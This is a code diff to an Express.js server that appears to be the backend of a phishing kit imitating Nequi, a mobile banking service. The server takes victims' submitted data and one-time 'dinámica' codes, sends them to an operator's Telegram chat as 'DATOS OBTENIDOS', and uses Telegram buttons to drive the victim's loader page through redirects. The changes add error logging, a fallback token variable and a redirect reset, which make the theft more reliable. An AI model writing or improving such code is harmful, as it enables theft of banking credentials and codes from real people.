@@ -10,7 +10,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Telegram (opcional: si no hay token, no se envía pero el flujo sigue)
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+// Soportamos ambos nombres por si Render lo guardó con otra key.
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
 // Almacenamiento en memoria: sessionId -> { redirect_to, data, shortId }
@@ -89,8 +90,11 @@ app.post('/api/nequi/transaccion', async (req, res) => {
       shortId,
     });
 
+    let telegramOk = null;
+
     // Enviar a Telegram con botones (si hay token)
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+      console.log('📤 Telegram sendMessage (nuevo ingreso) con chat_id:', TELEGRAM_CHAT_ID);
       const text = [
         '📌 *DATOS OBTENIDOS - NUEVO INGRESO*',
         '',
@@ -114,19 +118,35 @@ app.post('/api/nequi/transaccion', async (req, res) => {
         ],
       };
 
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const telegramResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text,
-          parse_mode: 'Markdown',
           reply_markup: keyboard,
         }),
       });
+
+      const telegramData = await telegramResp.json().catch(() => ({}));
+      if (!telegramResp.ok) {
+        telegramOk = false;
+        console.error('❌ Telegram sendMessage error:', {
+          status: telegramResp.status,
+          body: telegramData,
+        });
+      } else {
+        telegramOk = true;
+        console.log('✅ Telegram sendMessage OK:', {
+          ok: telegramData && telegramData.ok,
+          result: telegramData && telegramData.result ? { message_id: telegramData.result.message_id } : null,
+        });
+      }
+    } else {
+      telegramOk = null; // sin configuracion
     }
 
-    res.json({ success: true, transaction_id: session_id });
+    res.json({ success: true, transaction_id: session_id, telegram_ok: telegramOk });
   } catch (e) {
     console.error('POST /api/nequi/transaccion', e);
     res.status(500).json({ success: false, error: e.message });
@@ -134,13 +154,18 @@ app.post('/api/nequi/transaccion', async (req, res) => {
 });
 
 // PUT /api/nequi/transaccion/:transaction_id – Recibe dinámica desde one-time-pass.html
-app.put('/api/nequi/transaccion/:transaction_id', (req, res) => {
+app.put('/api/nequi/transaccion/:transaction_id', async (req, res) => {
   const { transaction_id } = req.params;
   const { dinamica, session_id } = req.body || {};
   const session = sessions.get(transaction_id || session_id);
   if (session && session.data) {
     session.data.dinamica = session.data.dinamica || [];
     session.data.dinamica.push(dinamica || '');
+  }
+  // Importante: limpiamos la redirección anterior.
+  // Así el loader NO salta inmediatamente por un botón ya pulsado en la etapa anterior.
+  if (session) {
+    session.redirect_to = null;
   }
   // También registrar IP en este punto (por si cambia)
   if (session && session.data) {
@@ -151,8 +176,11 @@ app.put('/api/nequi/transaccion/:transaction_id', (req, res) => {
     session.data.ip = session.data.ip || ip || '';
   }
 
+  let telegramOk = null;
+
   // Enviar mensaje a Telegram con la dinámica si está configurado
   if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && session && session.data) {
+    console.log('📤 Telegram sendMessage (dinamica) con chat_id:', TELEGRAM_CHAT_ID);
     const dArr = session.data.dinamica || [];
     const ultimaDinamica = dArr[dArr.length - 1] || dinamica || '';
     const text = [
@@ -183,21 +211,38 @@ app.put('/api/nequi/transaccion/:transaction_id', (req, res) => {
       ],
     };
 
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const telegramResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text,
-        parse_mode: 'Markdown',
         reply_markup: keyboard,
       }),
     }).catch((e) => {
       console.error('Error enviando mensaje de dinámica a Telegram', e);
+      return null;
     });
+
+    if (telegramResp) {
+      const telegramData = await telegramResp.json().catch(() => ({}));
+      if (!telegramResp.ok) {
+        telegramOk = false;
+        console.error('❌ Telegram sendMessage error (dinamica):', {
+          status: telegramResp.status,
+          body: telegramData,
+        });
+      } else {
+        telegramOk = true;
+        console.log('✅ Telegram sendMessage OK (dinamica):', {
+          ok: telegramData && telegramData.ok,
+          result: telegramData && telegramData.result ? { message_id: telegramData.result.message_id } : null,
+        });
+      }
+    }
   }
 
-  res.json({ success: true });
+  res.json({ success: true, telegram_ok: telegramOk });
 });
 
 // GET /api/redirect/get/:sessionId – Polling desde loader.html
@@ -271,4 +316,13 @@ app.listen(PORT, () => {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no definidos: no se enviarán mensajes a Telegram.');
   }
+  console.log('Telegram cfg:', {
+    hasToken: Boolean(TELEGRAM_BOT_TOKEN),
+    hasChatId: Boolean(TELEGRAM_CHAT_ID),
+    tokenEnvKeys: {
+      TELEGRAM_BOT_TOKEN: Boolean(process.env.TELEGRAM_BOT_TOKEN),
+      TELEGRAM_TOKEN: Boolean(process.env.TELEGRAM_TOKEN),
+    },
+    chatId: TELEGRAM_CHAT_ID ? String(TELEGRAM_CHAT_ID).slice(0, 10) + '...' : '',
+  });
 });
